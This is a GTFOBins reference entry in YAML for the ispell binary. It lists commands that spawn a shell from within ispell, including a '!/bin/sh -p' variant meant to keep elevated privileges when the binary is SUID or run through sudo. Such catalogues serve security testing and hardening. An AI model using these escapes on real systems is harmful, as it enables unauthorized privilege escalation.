<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ispell -->
---
functions:
  shell:
  - code: |-
      ispell /etc/hosts
      !/bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          ispell /etc/hosts
          !/bin/sh -p
        shell: false
      unprivileged:
...
